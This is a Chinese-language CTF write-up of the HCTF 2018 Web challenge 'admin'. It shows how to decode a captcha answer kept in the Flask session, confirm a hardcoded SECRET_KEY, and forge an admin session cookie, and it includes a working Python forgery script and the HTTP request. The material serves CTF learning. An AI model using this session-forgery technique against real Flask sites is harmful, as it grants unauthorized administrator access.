---
title: HCTF 2018 - Web - admin
date: 2026-11-14 18:15:00
categories:
  - CTF
  - HCTF 2018
  - Web
tags:
  - Flask-session伪造
  - SECRET_KEY硬编码
  - 验证码绕过
  - Unicode变体
cover: /img/cover/girl-wading-rainy-street.jpg
description: HCTF 2018 的 Flask session 伪造题。管理员判断依赖 session 的 name 字段，验证码答案藏在 image 字段可解码绕过。验签确认硬编码密钥 ckj123，伪造 name=admin 拿 flag。
keywords:
  - Flask
  - session伪造
  - SECRET_KEY
  - 验证码绕过
  - HCTF2018
ai: >-
  本题来自 HCTF 2018，考点是 Flask session 伪造与 SECRET_KEY 泄漏，目标是成为 admin 在 /index 拿 flag。验证码答案以 base64 存在 session 的 image 字段可解码绕过；管理员判断依赖 session 的 name 字段。直接注册 admin 已存在，Unicode 变体归一化后仍不等。于是用真实登录 session 验签确认硬编码密钥 ckj123，再以 SecureCookieSessionInterface 签发 name=admin 的 cookie 访问 /index 得 flag，脱敏记为 flag{xxxx}。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | HCTF 2018 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |
| 考点 | Flask session 伪造（SECRET_KEY 泄漏 / 硬编码） |

## 信息收集

一个 Flask 应用，包含注册、登录、修改密码等功能。首页提示 `<!-- you are not admin -->`，目标是以 admin 身份登录，在 `/index` 页面获得 flag。

主要路由：

| 路由 | 功能 |
|---|---|
| `/`、`/index` | 主页（提示 `you are not admin`） |
| `/register` | 注册（需验证码 verify_code） |
| `/login` | 登录 |
| `/change` | 修改密码（需登录） |
| `/code` | 验证码图片 |

session cookie 为 Flask 格式，可 base64 解码（压缩的需先 zlib 解压）。

## 漏洞分析

### 验证码绕过

注册需要 `verify_code`。访问 `/code` 时，服务端会在 session 中写入 `image` 字段（验证码答案的 base64）：

```http
GET /code
Set-Cookie: session={"image":{" b":"bTlLZA=="}}...
```

解码 `image` 字段即可获得验证码答案（`bTlLZA==` → `m9Kd`），从而绕过验证码。

### 登录后的 session 结构

注册一个普通用户（如 `abcdef` / `abcdef123`）并登录：

```json
{
  "_fresh": true,
  "_id": "fb314f0d...",
  "csrf_token": "431498...",
  "name": "abcdef",
  "user_id": "12"
}
```

- `name`：用户名（经 `strlower` 处理，即 nodeprep / NFKC + casefold）。
- `user_id`：用户 ID。
- 判断 admin 的逻辑为 `session['name'] == 'admin'`。

### SECRET_KEY 发现

尝试注册 `admin` 报错 `The username has been registered`（admin 已存在）。直接注册 Unicode 变体（如 `admİn`）虽然成功，但 `name` 字段变为 `admi̇n`（带组合点），不等于 `admin`。

由于无法通过注册绕过，转向 **Flask session 伪造**：用一个真实的登录 session，对候选 SECRET_KEY 验签，发现 SECRET_KEY 为硬编码的 **`ckj123`**（HCTF 2018 原题即为此值）。

## 利用过程

1. 访问 `/code` 解码 session `image` 字段拿到验证码，注册普通用户并登录。
2. 观察登录后的 session 结构，确认 `name` 字段决定管理员身份。
3. 用真实 session 验签，确认硬编码密钥 `ckj123`。
4. 用 `SecureCookieSessionInterface` 以 `ckj123` 伪造 `name=admin`、`user_id=1` 的 session。
5. 携带伪造的 session 访问 `/index`，获得 flag。

## 完整 EXP

伪造 admin session（Python）：

```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

app = Flask(__name__)
app.secret_key = 'ckj123'          # 硬编码 SECRET_KEY
s = SecureCookieSessionInterface()
ser = s.get_signing_serializer(app)

data = {
    '_fresh': True,
    '_id': b'fb314f0dac8c54e372032c589c8b7f2996e34ca10911d7ab1e5716a33b738c6e663470ad410d08799b41d10dacf13269b221459a39374d064f09bb40b85b1b34',
    'csrf_token': b'431498867cda937f47f7b1b35cb8e01686567526',
    'name': 'admin',
    'user_id': '1',
}
sess = ser.dumps(data)
print(sess)

# 访问：GET /index  Cookie: session=<sess>
```

携带伪造 cookie 请求：

```http
GET /index HTTP/1.1
Host: target:8080
Cookie: session=<sess>
```

## Flag

`flag{xxxx}`（已脱敏）

## 踩坑与总结

1. Flask session 结构可通过 base64 解码（压缩的需先 zlib 解压）。
2. 验证码答案存储在 session 的 `image` 字段中，可解码绕过。
3. SECRET_KEY 硬编码为 `ckj123`，导致 session 可被任意伪造。
4. 伪造 `name=admin` 的 session 即可成为管理员；`strlower` 会把 Unicode 变体归一化，注册变体这条路走不通。
